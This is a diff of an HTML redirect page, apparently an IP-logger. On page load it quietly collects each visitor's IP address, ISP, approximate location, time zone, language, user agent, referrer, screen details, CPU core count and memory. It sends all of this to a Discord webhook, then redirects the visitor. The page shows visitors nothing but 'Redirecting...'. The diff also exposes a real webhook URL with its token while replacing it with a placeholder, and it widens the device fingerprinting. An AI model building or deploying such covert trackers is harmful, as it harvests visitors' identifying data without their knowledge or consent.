@@ -3,84 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>I'm redirecting...</title>
+    <title>I`m redirecting...</title>
     <script>
 
-        const webhookUrl = "https://discord.com/api/webhooks/1474312307013324904/GtRYtpvEd4CiQgI_QAW74Wk6ah2TMZRk6-zAG16MEJTeCNFl9L6gKewvnNZCw5Rx7-OL";
-        
-        
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // ご自身のWebhook URL
         const redirectUrl = "https://ima-aarr.github.io/rumia-homepage.github.io/";
 
         async function logAndRedirect() {
             try {
-               
+      
                 const geoResponse = await fetch('https://ipapi.co/json/');
                 const geoData = await geoResponse.json();
 
-             
                 const ipAddress = geoData.ip || "取得不可";
-                const location = `${geoData.country_name || ""} ${geoData.region || ""} ${geoData.city || ""}`.trim() || "取得不可";
                 const isp = geoData.org || "取得不可";
+                const location = `${geoData.country_name || ""} ${geoData.region || ""} ${geoData.city || ""}`.trim() || "取得不可";
 
-          
                 const accessTime = new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" });
                 const userAgent = navigator.userAgent;
                 const referrer = document.referrer || "直接アクセス";
-                const screenRes = `${window.screen.width} x ${window.screen.height}`; 
-                const language = navigator.language || "不明"; 
                 
-     
+
+                const screenRes = `${window.screen.width} x ${window.screen.height} (色深度: ${window.screen.colorDepth}bit)`;
+                
+
+                const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} コア` : "不明";
+                const ram = navigator.deviceMemory ? `約 ${navigator.deviceMemory} GB` : "不明";
+                
+           
+                const language = navigator.language || "不明";
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "不明";
+
+              
                 const payload = {
-                    username: "詳細アクセス通知ボット",
+                    username: "おわっぱ",
                     embeds: [
                         {
-                            title: " 新しいアクセスを検知しました",
-                            color: 16729344, 
+                            title: "🕵️ 新しいアクセス環境情報を取得しました",
+                            color: 5814783, 
+                            description: "※プロキシ/VPNが使用されている場合、IPは偽装されていますが、デバイス情報は実機のものです。",
                             fields: [
-                                { name: "IP", value: `\`${ipAddress}\``, inline: true },
-                                { name: "だいたいの場所", value: `\`${location}\``, inline: true },
-                                { name: "プロバイダ (ISP)", value: `\`${isp}\``, inline: true },
-                                { name: "アクセス日時", value: accessTime, inline: true },
-                                { name: "画面解像度", value: screenRes, inline: true },
-                                { name: "言語設定", value: language, inline: true },
-                                { name: "リファラ (遷移元)", value: referrer, inline: false },
+                                { name: "IPアドレス（さーばーないから多分）", value: `\`${ipAddress}\``, inline: true },
+                                { name: "プロバイダ", value: `\`${isp}\``, inline: true },
+                                { name: "推測地点", value: `\`${location}\``, inline: true },
+                                { name: "端末タイムゾーン", value: `\`${timeZone}\``, inline: true },
+                                { name: "言語設定", value: `\`${language}\``, inline: true },
+                                { name: "CPU論理コア数", value: `\`${cpuCores}\``, inline: true },
+                                { name: "推定メモリ容量", value: `\`${ram}\``, inline: true },
+                                { name: "画面解像度・色深度", value: `\`${screenRes}\``, inline: true },
+                                { name: "アクセス日時", value: accessTime, inline: false },
+                                { name: "遷移元 (Referrer)", value: referrer, inline: false },
                                 { name: "User-Agent", value: `\`${userAgent}\``, inline: false }
-                            ],
-                            footer: {
-                                text: "※位置情報はIPアドレスに基づくおおよそのものです"
-                            }
+                            ]
                         }
                     ]
                 };
 
-                
+   
                 if (webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
                     await fetch(webhookUrl, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
-                } else {
-                    console.warn("Webhook URLが設定されていません。");
                 }
 
             } catch (error) {
-                
-                console.error("情報の取得または送信に失敗しました:", error);
+                console.error("エラー:", error);
             } finally {
-                
+      
                 window.location.replace(redirectUrl);
             }
         }
 
-    
         window.onload = logAndRedirect;
     </script>
 </head>
-<body style="background-color: #1a1a1a; color: #ffffff; text-align: center; padding-top: 20vh; font-family: sans-serif;">
-    <h2>I'm redirecting...</h2>
-    <p style="color: #aaaaaa;">Please wait a few seconds. The page will move automatically.</p>
+<body style="background-color: #0d1117; color: #c9d1d9; text-align: center; padding-top: 20vh; font-family: monospace;">
+    <h2>Redirecting...</h2>
+    <p style="color: #8b949e;">Please wait.</p>
 </body>
 </html>
